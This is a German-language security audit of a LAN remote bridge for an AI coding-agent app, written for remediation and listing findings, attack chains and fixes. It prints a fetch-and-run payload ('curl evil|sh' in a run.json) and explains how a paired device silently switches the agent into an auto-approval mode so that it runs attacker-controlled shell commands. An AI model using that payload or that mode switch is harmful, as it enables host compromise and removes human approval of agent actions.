# Sicherheitsüberprüfung — mads Remote-Bridge (LAN-Companion)

> Ergänzung zum Haupt-Audit (`SECURITY-AUDIT-2026-07-09.md`). Prüft ausschließlich die **neue
> Remote-Bridge** (`docs/design/remote-companion-app.md`, P0–P3): WSS/TLS/mDNS, Pairing/Auth,
> Command-Forward, File-RPC, Snapshot/Mirror. Methodik wie das Haupt-Audit: 5 parallele
> Prüf-Domänen (Auth/Pairing · TLS/Transport/DoS/mDNS · Command-Forward · File-RPC/Scope ·
> Datenexposition), jeder Befund **adversarial am Quellcode verifiziert**. Stand: `5aaacb5`.

---

## 1. Management-Zusammenfassung

Die **Pre-Auth-Fläche ist gut geschlossen** und die **Command-Ebene ist bewusst gehärtet** — das
Fundament der Bridge ist solide (siehe §6). Alle High-Befunde setzen voraus, dass die Bridge
**aktiviert** ist UND ein Gerät **gekoppelt** wurde (oder ein Token geleakt ist) — es gibt **keine
unauthentifizierte RCE**.

Die Schwächen liegen **hinter dem Pairing**, an einer einzigen strukturellen Stelle:

> **Ein gekoppeltes Gerät erhält faktisch die volle lokale Autorität des Menschen am Gerät — aber
> mehrere Kontrollen, die genau das eindämmen sollen, sind fail-open (Deny-Listen statt
> Allow-Listen).** Ein gekoppeltes (oder Token-geleaktes) Gerät kann daher aus der Ferne: (a) einen
> Agenten **still** in den Auto-Ausführungs-Modus versetzen (RCE), (b) den Datei-Scope auf fast das
> ganze `$HOME` **ausweiten** (Lesen/Schreiben, Persistenz), (c) **unredigierte Secrets** aus dem
> Agenten-Stream mitlesen. Die Bridge macht damit die im Haupt-Audit gefundenen Host-lokalen
> Befunde **TAU-1, TAU-2 und SEC-1 netzwerk-erreichbar** — jetzt von einem *Remote*-Akteur statt nur
> von einem injizierten lokalen Agenten.

Das Design benennt das Angreifermodell korrekt („eine gekoppelte Remote hat volle Autorität"). Die
Befunde präzisieren, **wo die Implementierung hinter dieser Absicht zurückbleibt** — konkret dort,
wo eine Deny-Liste eine neuere/weitere Fähigkeit übersieht.

### Befund-Übersicht

| Sev | ID | Titel |
|-----|-----|-------|
| 🔴 High | RB-AUTH-1 | Permission-Mode-Denylist übersieht `auto` + `acceptEdits` → gekoppeltes Gerät schaltet **stille Host-RCE** frei |
| 🔴 High | RB-FS-1 | File-RPC `register_root` lässt einen Remote **beliebigen FS-Root** wählen (~/Library, ~/.config, /Volumes …) → Off-Projekt-R/W + Login-Persistenz (**TAU-2 netzwerk-erreichbar**) |
| 🔴 High | RB-FS-2 | Dangling-Symlink-Write-Escape (**TAU-1**) via File-RPC `write_file` **aus der Ferne** → Schreiben ausserhalb des Scopes |
| 🔴 High | RB-RCE-1 | Netzwerk-RCE: Remote schreibt `.mads/run.json` (nicht in `is_denied`) → `start_devserver` → `/bin/sh -c` mit vollem Host-`env` |
| 🟠 Med | RB-LEAK-1 | Event-Tee + Snapshot streamen **unredigierte** Tool-IO/Secrets + Verlauf (bis 500 Events) an jedes gekoppelte Gerät (**SEC-1 verlässt den Host über LAN**) |
| 🟠 Med | RB-AUTH-2 | Token-Gültigkeit/Widerruf wird auf dem command/file-rpc-Pfad **nicht pro Frame** geprüft → bis ~15 s Vollzugriff nach Revoke |
| 🟠 Med | RB-NET-1 | Listener bindet **`0.0.0.0`** (alle Interfaces: Firmen-LAN, Café-WLAN, VPN/tun), keine RFC1918-Beschränkung; Auto-Start via persistiertem Flag |
| 🟠 Med | RB-DOS-1 | Keine Verbindungs-Obergrenze / kein Handshake-Timeout → unauth. LAN-Peer erschöpft fds/Speicher (Slowloris) |
| 🔵 Low | RB-MDNS-1 | mDNS-TXT leakt Projektname, pid, LAN-IPv4 und stabilen Fingerprint an die ganze Broadcast-Domäne; spoofbar |
| 🔵 Low | RB-AUTH-3 | Kein Throttle/Lockout bei Token-`auth`-Versuchen → Argon2-CPU-DoS bei bekannter deviceId |
| 🔵 Low | RB-AUTH-4 | Jeder erreichbare Host kann die 5 PIN-Versuche aufbrauchen → **Pairing-DoS** |
| 🔵 Low | RB-AUTHZ-1 | Pairing = volle lokale Autorität — kein Observer-/Read-only-Tier, kein separates Gate für Merge-nach-main / Code-Exec |
| 🔵 Low | RB-DOS-2 | WS-Frame/Message-Größe (16/64 MiB) **pre-auth** geparst — für ein winziges Steuerprotokoll zu großzügig |
| ⚪ Info | RB-INFO-1 | PIN-Vergleich variabel-zeitig (Token-Pfad ist korrekt konstant-zeitig) |
| ⚪ Info | RB-POS | Positiv: Pre-Auth-Fläche geschlossen, Command-Ebene gehärtet (§6) |

---

## 2. Kritischer Angriffspfad (die Befunde als Kette)

Threat-Actor: ein **gekoppeltes Gerät** (oder ein geleaktes Geräte-Token) — laut Design ein
Voll-Autoritäts-Akteur; der Punkt ist, dass die Bridge diese Autorität *nicht* mit ihren eigenen
Defense-in-Depth-Kontrollen eindämmt.

```
Bridge aktiviert (UI-Toggle / persistiertes Flag) + Gerät gekoppelt  ▸ RB-NET-1: auf ALLEN Interfaces erreichbar
        │
        ▼ RB-FS-1 / RB-FS-2:  register_root(beliebiger Pfad) → write_file
        │        z. B. dangling-symlink → ~/Library/LaunchAgents/x.plist   (Persistenz, Off-Scope-Write)
        │        oder .mads/run.json = {"services":[{"command":"curl evil|sh"}]}
        ▼ RB-RCE-1:  (Mensch/Autopilot) start_devserver  →  /bin/sh -c "…"  mit vollem Host-env
        │        ODER
        ▼ RB-AUTH-1: set_permission_mode(mode:"auto")  /  start_agent(permissionMode:"auto")
        │        → Agent führt attacker-kontrollierte Bash STILL aus (kein Host-Prompt)
        │
        ▼ RB-LEAK-1: Event-Tee + Snapshot spiegeln unredigierte Tool-IO / `cat .env`-Ausgaben
                     zurück an das Gerät  →  Exfiltration über den regulären Mirror-Kanal
        │
        ▼ RB-AUTH-2: nach „Gerät widerrufen" bleibt all das ~15 s aktiv
```

Jedes Glied ist unten am Code belegt. Mehrere Pfade sind **unabhängig** (RCE via `auto`-Mode ODER
via run.json ODER via LaunchAgents-Symlink) — das erhöht die Robustheit des Angriffs.

---

## 3. High-Severity-Befunde (verifiziert)

### RB-AUTH-1 — Permission-Mode-Denylist übersieht `auto` + `acceptEdits` 🔴 High
**Datei:** `src-tauri/src/bridge.rs:64, :95-101`

`FORBIDDEN_PERMISSION_MODES = ["bypassPermissions","dontAsk"]` wird in `validate_command_value` gegen
die Felder `permissionMode` (bei `start_agent`) und `mode` (bei `set_permission_mode`) geprüft — mit
der erklärten Absicht (bridge.rs:61-64) „Modi zu blocken, die Tool-Aufrufe automatisch freigeben —
RCE-äquivalent". Die `PermissionMode`-Union (`shared/protocol.ts:27`) hat aber **sechs** Werte; der
mads-eigene Auto-Freigabe-Modus **`auto`** — der *eigentliche* Unbeaufsichtigt-Ausführungs-Modus —
und **`acceptEdits`** (Auto-Freigabe für Datei-Writes) fehlen in der Denylist. Ein gekoppeltes Gerät
sendet `{"type":"start_agent","prompt":"<attacker>","permissionMode":"auto"}` (oder
`set_permission_mode mode:"auto"`) → Validierung passiert → `session.ts:418-428` gibt für jeden
vom (per CMD-1/CMD-2 umgehbaren) Klassifizierer als `allow` bewerteten Tool-Aufruf — inkl. Bash —
`behavior:"allow"` **ohne Host-Prompt** zurück. Das hebelt genau die Kontrolle aus, die der Code
selbst als „RCE-Schutz / Höchste Sicherheitspriorität" bezeichnet. **Verifiziert** end-to-end.

**Fix:** Denylist → **Allowlist**: nur `default` und `plan` als remote-setzbare Modi zulassen
(default-deny für alles Gegenwärtige/Zukünftige). Prüfung auf beiden Feldern beibehalten; Tests für
`auto`/`acceptEdits`-Ablehnung ergänzen.

### RB-FS-1 / TAU-2-über-Netz — `register_root` lässt einen Remote beliebige Roots wählen 🔴 High
**Datei:** `src-tauri/src/files.rs:455-470` (via `bridge.rs:193-196`)

Der Per-Connection-`FsScope` startet leer, aber die File-RPC-Op `register_root` ruft **dieselbe
permissive `register_root_inner`** wie der lokale Pfad. Deren einzige Breitenprüfung ist eine
**Deny-Liste**: sie lehnt nur `/`, exakt `$HOME`, `<2` Segmente und absolute System-Prefixe
(`/etc /usr /bin /Library /private …`) ab. Weil die Prefixe **absolut** sind, matcht `~/Library/...`
**nicht** `/Library` — registrierbar (und damit voll R/W über File-RPC) sind u. a.
`~/Library/Application Support/**` (Browser-Profile/Tokens), `~/Documents`, `~/.config`,
`/Users/Shared`, `/Volumes/*`. Anders als lokal (Mensch wählt den Root per Dialog) wählt hier der
**Netzwerk-Peer** den Root → die Workspace-Trust-Grenze fehlt. → Remote-Lesen (GitHub-/Cloud-Tokens
exfiltrieren) **und** -Schreiben (Persistenz) ohne jeden Prompt.

**Fix:** Für den Bridge-Pfad `register_root` **nicht** an `register_root_inner` delegieren, sondern
den Per-Connection-Scope host-seitig aus dem **autoritativen offenen Projekt** seeden — `repoRoot`
+ `~/mads-worktrees/<slug>/*` — als **Allow-Liste**; ein vom Client benannter beliebiger Pfad ist
No-op/abgelehnt.

### RB-FS-2 / TAU-1-über-Netz — Dangling-Symlink-Write-Escape via `write_file` 🔴 High
**Datei:** `src-tauri/src/files.rs:178-199` (via `bridge.rs:205-214`)

Der File-RPC-`write_file`-Pfad nutzt `write_file_inner → ensure_in_scope →
canonicalize_allowing_missing` — denselben Code wie das lokale **TAU-1**. Für ein noch nicht
existierendes Ziel wird nur das **Elternverzeichnis** kanonisiert, die finale Komponente verbatim
angehängt und **nie** per `symlink_metadata` als Symlink re-geprüft. `Path::exists()` folgt Symlinks
→ ein **dangling** Symlink (Ziel fehlt) meldet `false`, nimmt den „missing"-Zweig, `canonical =
<root>/<link>` besteht `starts_with(root)`, dann folgt `std::fs::write` dem Symlink **aus dem Scope
heraus**. Ein bösartiges Repo materialisiert beim Worktree-Checkout `x -> ~/Library/LaunchAgents/…`;
ein Remote-`write_file` schreibt dann eine Autostart-Datei. Jetzt **remote auslösbar**.

**Fix:** In `canonicalize_allowing_missing` (missing-Zweig) jede noch nicht kanonisierte Komponente
(mind. die finale) per `symlink_metadata` prüfen und Symlinks ablehnen; Write mit `O_NOFOLLOW` /
`create_new`. **Ein Fix in `files.rs` schließt lokale (TAU-1) und Remote-Instanz gleichzeitig.**

### RB-RCE-1 — Netzwerk-RCE via `.mads/run.json` + `start_devserver` 🔴 High
**Datei:** `src-tauri/src/files.rs:146-172` · `sidecar/src/devserver.ts:237,254`

Zwei Bridge-Flächen komponieren zu RCE für ein gekoppeltes Gerät: (1) File-RPC `write_file` ist
post-auth erreichbar; `is_denied()` blockt `.git/.ssh/.env/id_rsa/…`, **aber nicht `.mads/`** — ein
Remote registriert den Repo-Root (RB-FS-1) und schreibt still
`{"services":[{"command":"curl evil|sh"}]}`. (2) Der Dev-Server führt `command`/`install` aus
`.mads/run.json` via `spawn("/bin/sh", ["-c", command])` **mit vollem `...process.env`** aus. Der
nächste „Dev-Server starten"-Klick (Mensch/Autopilot) triggert die Ausführung. Ergänzt den
Haupt-Audit-Befund RCE-1 um den **Remote-Schreibvektor**.

**Fix:** `.mads/` (bzw. konkret `run.json`) in `is_denied` aufnehmen; die konkreten
`command`/`install`-Strings im Start-Dialog zur Bestätigung anzeigen; Dev-Server-`env` reduzieren
(Secrets strippen).

---

## 4. Medium-Severity-Befunde

### RB-LEAK-1 — Unredigierter Stream + Snapshot verlassen den Host (SEC-1 über LAN) 🟠 Med
**Datei:** `src-tauri/src/bridge.rs:673-678` · `sidecar/src/sidecar.rs:165` · `orchestrator.ts:376-401`
Der Event-Tee reicht **jede rohe Sidecar-stdout-Zeile verbatim** an jeden authentifizierten Client
(`{"channel":"event","msg":<line>}`, keine Redaktion). Diese NDJSON trägt laut SEC-1 unredigierte
Tool-Call-Inputs (ganze Shell-Kommandozeilen), Tool-Outputs (`env`/`cat .env`-Ausgaben),
Assistant-Text/Thinking. `request_snapshot` (jedes Gerät darf es senden) **replayt zusätzlich bis zu
500 gepufferte Events pro Agent + offene Permission-Request-Inputs** → ein **später** koppelndes /
reconnectendes Gerät bekommt auch **historische** Secrets.
**Fix:** Zentral in `sidecar/src/io.ts send()` redigieren (`findSecrets` über `tool_use.input`,
`tool_result.output`, `assistant_text`, `thinking`) — dann erben **alle** Sinks (Frontend, Tee,
Snapshot-Puffer, Transcript). Schließt SEC-1 lokal **und** über die Bridge in einem Punkt.

### RB-AUTH-2 — Widerruf/Token nicht pro Frame geprüft → ~15 s Nachlauf 🟠 Med
**Datei:** `src-tauri/src/bridge.rs:152-167, :685-692, :41`
Nach erfolgreichem Pairing autorisiert `authed.is_some()` **allein** jeden weiteren privilegierten
Frame — **kein** erneuter `verify_token`/`is_revoked` pro Frame. Widerruf wird nur auf dem
Heartbeat-Tick (alle 15 s) beobachtet → bis ~15 s Vollzugriff (inkl. Secret-Tee) nach „widerrufen".
**Fix:** Pro-Frame-`is_revoked`-Check am Kopf der `command`/`file-rpc`-Arme.

### RB-NET-1 — Bindet `0.0.0.0` (alle Interfaces) + Auto-Start 🟠 Med
**Datei:** `src-tauri/src/bridge.rs:475-480`
`bind_and_serve` bindet `Ipv4Addr::UNSPECIFIED` → erreichbar auf **jedem** Interface (Firmen-LAN,
Café-WLAN, aktives VPN/tun), ohne RFC1918-/Interface-Allowlist. Gating ist zudem ein persistiertes
Flag (Auto-Start), nicht mehr nur die Env-Gate.
**Fix:** Auf die konkrete Default-Route-/RFC1918-Adresse binden (vorhandenes `primary_lan_ip()`
wiederverwenden); öffentlich-routbare Interfaces verweigern.

### RB-DOS-1 — Keine Verbindungs-Grenze / kein Handshake-Timeout 🟠 Med
**Datei:** `src-tauri/src/bridge.rs:612-642`
`accept_loop` spawnt unbegrenzt eine Task pro TCP-Verbindung, ohne Cap, ohne Per-IP-Limit, ohne
Accept-Backoff; `handle_conn` awaited TLS-/WS-Handshake **ohne Timeout** → ein Peer, der nie einen
ClientHello sendet, parkt eine Task samt fd/Puffer (Slowloris) → fd-/Speicher-Erschöpfung durch
unauth. LAN-Peer.
**Fix:** Handshake in `tokio::time::timeout`; Gesamt- und Per-IP-Verbindungs-Cap; Grace-Period für
Auth; Accept-Backoff.

---

## 5. Low / Info

- **RB-MDNS-1** (`bridge.rs:579`) — TXT leakt Projektname, pid, LAN-IPv4, stabilen Fingerprint an die
  ganze Broadcast-Domäne; spoofbar. → TXT minimieren (Projektname/pid raus).
- **RB-AUTH-3** (`auth.rs:124`) — kein Throttle bei Token-`auth` → Argon2-CPU-DoS bei bekannter
  deviceId. → Per-Device-Versuchs-Throttle.
- **RB-AUTH-4** (`auth.rs:88`) — jeder Host kann die 5 PIN-Versuche aufbrauchen → Pairing-DoS. →
  Versuche an Quelle binden / PIN neu ausgeben.
- **RB-AUTHZ-1** (`bridge.rs:53`) — Pairing = volle Autorität; kein Observer-Tier, kein Step-up für
  Merge-nach-main / Code-Exec. → Read-only-Geräte-Tier + Extra-Bestätigung für außen-wirksame Aktionen.
- **RB-DOS-2** (`bridge.rs:655`) — 16/64-MiB-Frames **pre-auth** geparst. → für das winzige
  Steuerprotokoll auf wenige KiB deckeln.
- **RB-INFO-1** (`auth.rs:100`) — PIN-Vergleich variabel-zeitig (Token-Pfad ist konstant-zeitig). →
  konstant-zeitiger PIN-Vergleich (Konsistenz).

---

## 6. Positiv hervorzuheben (verifiziert, keine Aktion nötig)

- **Pre-Auth-Fläche geschlossen:** `command`- und `file-rpc`-Frames werden vor dem Pairing abgelehnt
  (`bridge.rs:152-155`, `authed.is_none()`). Kein Pre-Auth-Command/File-Zugriff.
- **Command-Ebene gehärtet:** Allow-Liste erlaubter `HostMessage`-Typen (`HOST_MESSAGE_TYPES`); die
  weitergereichte Zeile wird aus einem validierten Struct **re-serialisiert** → **kein
  Newline-Smuggling** einer zweiten NDJSON-Zeile in den stdin (`bridge.rs:104`). Die zwei
  SDK-nativen Bypass-Modi (`bypassPermissions`,`dontAsk`) sind geblockt und getestet.
- **Token-Hashing:** Geräte-Tokens werden mit **Argon2** verifiziert (konstant-zeitig), nicht im
  Klartext verglichen.
- **Per-Connection-FsScope-Isolation** ist umgesetzt und unit-getestet; die Bridge weitet die
  prozessglobale `tauri-plugin-fs`-Watch-Scope **bewusst nicht** (nur die lokale Webview via
  `mads_register_root`).
- **Gating:** Standardmäßig aus (Env-Gate + persistiertes Flag), nicht ungefragt an.

---

## 7. Priorisierte Empfehlungen (Bridge)

**Sofort (die Post-Auth-Autorität eindämmen):**
1. **RB-AUTH-1** — Permission-Mode auf Allow-Liste `{default, plan}` umstellen (klein, schließt die
   stille Remote-RCE via `auto`/`acceptEdits`).
2. **RB-FS-1 + RB-RCE-1** — `register_root` über die Bridge auf `repoRoot` + `~/mads-worktrees/<slug>/*`
   beschränken (Allow-Liste) **und** `.mads/` in `is_denied` aufnehmen. Schließt Off-Projekt-R/W +
   den Remote-run.json-RCE-Vektor.
3. **RB-FS-2 (TAU-1)** — Symlink-Write-Escape in `files.rs` fixen (schließt lokal **und** remote).
4. **RB-LEAK-1 (SEC-1)** — zentrale Redaktion in `io.ts send()` (schließt SEC-1 in **allen** Sinks +
   der Bridge/dem Snapshot in einem Punkt).

**Danach (Härtung):** RB-AUTH-2 (pro-Frame-Revoke) · RB-NET-1 (RFC1918-Bind) · RB-DOS-1/2
(Handshake-Timeout + Caps + Frame-Deckel) · RB-MDNS-1 · RB-AUTH-3/4 · RB-AUTHZ-1 (Observer-Tier).

**Strukturell (mit dem Haupt-Audit geteilt):** eine echte **OS-Sandbox** für Agent-Bash/Dev-Server
und eine **Workspace-Trust-Grenze** würden RB-RCE-1, RB-FS-1/2 und die CMD-Befunde des Haupt-Audits
an der Wurzel entschärfen. Der `safe-command.ts`-Klassifizierer bleibt UX, keine Grenze.

---

## 8. Geteilte Fixes (beide Audits in einem Zug)

| Fix | schließt (Haupt) | schließt (Bridge) |
|-----|------------------|-------------------|
| Redaktion in `io.ts send()` | SEC-1 | RB-LEAK-1 |
| Symlink-Check in `canonicalize_allowing_missing` | TAU-1 | RB-FS-2 |
| `.mads/` in `is_denied` + Dev-Server-Env reduzieren | RCE-1 | RB-RCE-1 |
| `register_root` auf app-kontrollierte Roots | TAU-2 | RB-FS-1 |
| Permission-Mode-Allowlist | — (neu) | RB-AUTH-1 |

---

*Erstellt nach der Methodik des Anthropic-Cybersecurity-Skills-Katalogs (5 Prüf-Domänen, adversariale
Verifikation je Befund). 34 Befunde am Quellcode verifiziert; Zeilennummern beziehen sich auf
`5aaacb5`. Konvergenz: mehrere Prüfer fanden RB-AUTH-1, RB-FS-1/2 und RB-LEAK-1 unabhängig.*
